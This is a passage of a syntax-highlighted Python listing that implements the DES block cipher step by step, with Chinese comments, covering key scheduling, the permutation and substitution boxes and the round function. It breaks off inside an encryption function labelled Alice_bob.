class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#二进制转字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bintostr</span><span class="params">(st)</span>:</span></span><br><span class="line">    res=<span class="string">""</span></span><br><span class="line">    l=int(len(st)/<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(l):</span><br><span class="line">       res+=chr(int(st[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#字符串转二进制</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strtobin</span><span class="params">(st)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> st:</span><br><span class="line">        tmp = bin(ord(i))[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>-len(tmp)):</span><br><span class="line">            tmp = <span class="string">'0'</span>+tmp</span><br><span class="line">        res+=tmp</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#循环左移</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zuoyiwei</span><span class="params">(st,num)</span>:</span></span><br><span class="line">    my = st[num:len(st)]</span><br><span class="line">    my = my+st[<span class="number">0</span>:num]</span><br><span class="line">    <span class="keyword">return</span> my</span><br><span class="line"><span class="comment">#异或</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(str1,str2)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(str1)):</span><br><span class="line">        xor_res = int(str1[i],<span class="number">10</span>)^int(str2[i],<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> xor_res == <span class="number">1</span>:</span><br><span class="line">            res +=<span class="string">'1'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res +=<span class="string">'0'</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#PC-1盒</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_change_1</span><span class="params">(st)</span>:</span></span><br><span class="line">    key1_list = [<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>]</span><br><span class="line">    <span class="comment">#得到56位，去掉校验位</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key1_list:</span><br><span class="line">        res+=st[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#PC-2盒</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_change_2</span><span class="params">(st)</span>:</span></span><br><span class="line">    key2_list = [<span class="number">14</span>,<span class="number">17</span>,<span class="number">11</span>,<span class="number">24</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">28</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">21</span>,<span class="number">10</span>,<span class="number">23</span>,<span class="number">19</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">26</span>,<span class="number">8</span>,<span class="number">16</span>,<span class="number">7</span>,<span class="number">27</span>,<span class="number">20</span>,<span class="number">13</span>,<span class="number">2</span>,<span class="number">41</span>,<span class="number">52</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">47</span>,<span class="number">55</span>,<span class="number">30</span>,<span class="number">40</span>,<span class="number">51</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">48</span>,<span class="number">44</span>,<span class="number">49</span>,<span class="number">39</span>,<span class="number">56</span>,<span class="number">34</span>,<span class="number">53</span>,<span class="number">46</span>,<span class="number">42</span>,<span class="number">50</span>,<span class="number">36</span>,<span class="number">29</span>,<span class="number">32</span>]</span><br><span class="line">    <span class="comment">#压缩置换</span></span><br><span class="line">    <span class="comment">#去掉9，18，22，25，35，38，43，54位得到48位</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> key2_list:</span><br><span class="line">        res+=st[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#16轮迭代生成子密钥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_gen</span><span class="params">(st)</span>:</span></span><br><span class="line">    key_list = []<span class="comment">#子密钥表</span></span><br><span class="line">    key_change_res = key_change_1(st)</span><br><span class="line">    <span class="comment">#PC-1置换分成C，D两块</span></span><br><span class="line">    key_c = key_change_res[<span class="number">0</span>:<span class="number">28</span>]</span><br><span class="line">    key_d = key_change_res[<span class="number">28</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">17</span>): <span class="comment">#共16轮</span></span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">1</span>) <span class="keyword">or</span> (i==<span class="number">2</span>) <span class="keyword">or</span> (i==<span class="number">9</span>) <span class="keyword">or</span> (i==<span class="number">16</span>):<span class="comment">#按轮数循环左移</span></span><br><span class="line">            key_c = zuoyiwei(key_c,<span class="number">1</span>)</span><br><span class="line">            key_d = zuoyiwei(key_d,<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key_c = zuoyiwei(key_c,<span class="number">2</span>)</span><br><span class="line">            key_d = zuoyiwei(key_d,<span class="number">2</span>)</span><br><span class="line">        key_yiwei = key_c+key_d</span><br><span class="line">        <span class="comment">#压缩置换</span></span><br><span class="line">        key_res = key_change_2(key_yiwei)</span><br><span class="line">        key_list.append(key_res)</span><br><span class="line">    <span class="keyword">return</span> key_list</span><br><span class="line"><span class="comment">#初始IP置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">begin_change</span><span class="params">(st)</span>:</span></span><br><span class="line">    <span class="comment">#置换表</span></span><br><span class="line">    change_list = [<span class="number">58</span>,<span class="number">50</span>,<span class="number">42</span>,<span class="number">34</span>,<span class="number">26</span>,<span class="number">18</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">60</span>,<span class="number">52</span>,<span class="number">44</span>,<span class="number">36</span>,<span class="number">28</span>,<span class="number">20</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">62</span>,<span class="number">54</span>,<span class="number">46</span>,<span class="number">38</span>,<span class="number">30</span>,<span class="number">22</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">64</span>,<span class="number">56</span>,<span class="number">48</span>,<span class="number">40</span>,<span class="number">32</span>,<span class="number">24</span>,<span class="number">16</span>,<span class="number">8</span>,<span class="number">57</span>,<span class="number">49</span>,<span class="number">41</span>,<span class="number">33</span>,<span class="number">25</span>,<span class="number">17</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">59</span>,<span class="number">51</span>,<span class="number">43</span>,<span class="number">35</span>,<span class="number">27</span>,<span class="number">19</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">61</span>,<span class="number">53</span>,<span class="number">45</span>,<span class="number">37</span>,<span class="number">29</span>,<span class="number">21</span>,<span class="number">13</span>,<span class="number">5</span>,<span class="number">63</span>,<span class="number">55</span>,<span class="number">47</span>,<span class="number">39</span>,<span class="number">31</span>,<span class="number">23</span>,<span class="number">15</span>,<span class="number">7</span>]</span><br><span class="line">    res =<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> change_list:</span><br><span class="line">        res+=st[i<span class="number">-1</span>] <span class="comment">#因为列表是1-64，而数组是0-63，所以减一</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#E盒扩展置换，将32位输出扩展至48位</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_e</span><span class="params">(st)</span>:</span></span><br><span class="line">    <span class="comment">#E盒置换表</span></span><br><span class="line">    e_list = [<span class="number">32</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">1</span>]</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> e_list:</span><br><span class="line">        res +=st[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#S盒代换盒</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_s</span><span class="params">(st)</span>:</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="comment">#8个S盒代换表</span></span><br><span class="line">    s_list = [[<span class="number">14</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">13</span>],</span><br><span class="line">              [<span class="number">15</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">15</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">9</span>],</span><br><span class="line">              [<span class="number">10</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">14</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">12</span>],</span><br><span class="line">              [<span class="number">7</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">11</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">14</span>],</span><br><span class="line">              [<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">13</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">11</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">13</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">3</span>],</span><br><span class="line">              [<span class="number">12</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">11</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">15</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>],</span><br><span class="line">              [<span class="number">4</span>,<span class="number">11</span>,<span class="number">2</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">10</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">13</span>,<span class="number">0</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">14</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">12</span>,<span class="number">2</span>,<span class="number">15</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">15</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">15</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">12</span>],</span><br><span class="line">              [<span class="number">13</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">15</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">14</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">12</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">13</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">12</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>,<span class="number">0</span>,<span class="number">14</span>,<span class="number">9</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">12</span>,<span class="number">14</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">14</span>,<span class="number">7</span>,<span class="number">4</span>,<span class="number">10</span>,<span class="number">8</span>,<span class="number">13</span>,<span class="number">15</span>,<span class="number">12</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">11</span>]]</span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(st),<span class="number">6</span>):<span class="comment">#6位输入，4位输出</span></span><br><span class="line">        begin_s = st[i:i+<span class="number">6</span>]</span><br><span class="line">        row = int(begin_s[<span class="number">0</span>]+begin_s[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        col = int(begin_s[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        num = bin(s_list[j][row*<span class="number">16</span>+col])[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">for</span> padd <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>-len(num)):</span><br><span class="line">            num = <span class="string">"0"</span>+num</span><br><span class="line">        res += num</span><br><span class="line">        j = j+<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#P盒置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">box_p</span><span class="params">(st)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    p_list = [<span class="number">16</span>,<span class="number">7</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">29</span>,<span class="number">12</span>,<span class="number">28</span>,<span class="number">17</span>,<span class="number">1</span>,<span class="number">15</span>,<span class="number">23</span>,<span class="number">26</span>,<span class="number">5</span>,<span class="number">18</span>,<span class="number">31</span>,<span class="number">10</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">24</span>,<span class="number">14</span>,<span class="number">32</span>,<span class="number">27</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">19</span>,<span class="number">13</span>,<span class="number">30</span>,<span class="number">6</span>,<span class="number">22</span>,<span class="number">11</span>,<span class="number">4</span>,<span class="number">25</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> p_list:</span><br><span class="line">        res +=st[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#封装成F函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">funcF</span><span class="params">(st,key)</span>:</span></span><br><span class="line">    str_e_res = box_e(st)</span><br><span class="line">    xor_res = xor(str_e_res,key)</span><br><span class="line">    str_s_res = box_s(xor_res)</span><br><span class="line">    str_p_res = box_p(str_s_res)</span><br><span class="line">    <span class="keyword">return</span> str_p_res</span><br><span class="line"><span class="comment">#IP逆置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mov_IP</span><span class="params">(st)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    ip_list = [<span class="number">40</span>,<span class="number">8</span>,<span class="number">48</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">24</span>,<span class="number">64</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">7</span>,<span class="number">47</span>,<span class="number">15</span>,<span class="number">55</span>,<span class="number">23</span>,<span class="number">63</span>,<span class="number">31</span>,<span class="number">38</span>,<span class="number">6</span>,<span class="number">46</span>,<span class="number">14</span>,<span class="number">54</span>,<span class="number">22</span>,<span class="number">62</span>,<span class="number">30</span>,<span class="number">37</span>,<span class="number">5</span>,<span class="number">45</span>,<span class="number">13</span>,<span class="number">53</span>,<span class="number">21</span>,<span class="number">61</span>,<span class="number">29</span>,<span class="number">36</span>,<span class="number">4</span>,<span class="number">44</span>,<span class="number">12</span>,<span class="number">52</span>,<span class="number">20</span>,<span class="number">60</span>,<span class="number">28</span>,<span class="number">35</span>,<span class="number">3</span>,<span class="number">43</span>,<span class="number">11</span>,<span class="number">51</span>,<span class="number">19</span>,<span class="number">59</span>,<span class="number">27</span>,<span class="number">34</span>,<span class="number">2</span>,<span class="number">42</span>,<span class="number">10</span>,<span class="number">50</span>,<span class="number">18</span>,<span class="number">58</span>,<span class="number">26</span>,<span class="number">33</span>,<span class="number">1</span>,<span class="number">41</span>,<span class="number">9</span>,<span class="number">49</span>,<span class="number">17</span>,<span class="number">57</span>,<span class="number">25</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip_list:</span><br><span class="line">        res += st[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"><span class="comment">#封装64位加密</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESenc_test</span><span class="params">(mes,key)</span>:</span></span><br><span class="line">    mes_bin = strtobin(mes)<span class="comment">#明文转二进制</span></span><br><span class="line">    mes_IP = begin_change(mes_bin)<span class="comment">#IP置换</span></span><br><span class="line">    key_bin = strtobin(key)<span class="comment">#密钥转二进制</span></span><br><span class="line">    key_list = key_gen(key_bin)<span class="comment">#生成子密钥</span></span><br><span class="line">    mes_left = mes_IP[<span class="number">0</span>:<span class="number">32</span>]<span class="comment">#明文分两组32位</span></span><br><span class="line">    mes_right = mes_IP[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">15</span>):<span class="comment">#16轮F函数迭代</span></span><br><span class="line">        mes_tmp = mes_right</span><br><span class="line">        right_f_res = funcF(mes_right,key_list[i])</span><br><span class="line">        mes_right = xor(right_f_res,mes_left)</span><br><span class="line">        mes_left = mes_tmp</span><br><span class="line">    fin_right = mes_right</span><br><span class="line">    fin_left = xor(funcF(mes_right,key_list[<span class="number">15</span>]),mes_left)</span><br><span class="line">    fin = fin_left+fin_right</span><br><span class="line">    fin = mov_IP(fin)<span class="comment">#IP逆置换</span></span><br><span class="line">    <span class="keyword">return</span> fin<span class="comment">#返回密文</span></span><br><span class="line"><span class="comment">#Alice_bob</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DESenc_ab</span><span class="params">(mes,key)</span>:</span></span><br><span class="line">    mes_bin = strtobin(mes)<span class="comment">#明文转二进制</span></span><br><span class="line">    mes_IP = begin_change(mes_bin)<span class="comment">#IP置换</span></span><br><span class="line">    key_bin = key<span class="comment">#密钥转二进制</span></span><br><span class="line">    key_list = key_gen(key_bin)<span class="comment">#生成子密钥</span></span><br><span class="line">    mes_left = mes_IP[<span class="number">0</span>:<span class="number">32</span>]<span class="comment">#明文分两组32位</span></span><br><span class="line">    mes_right = 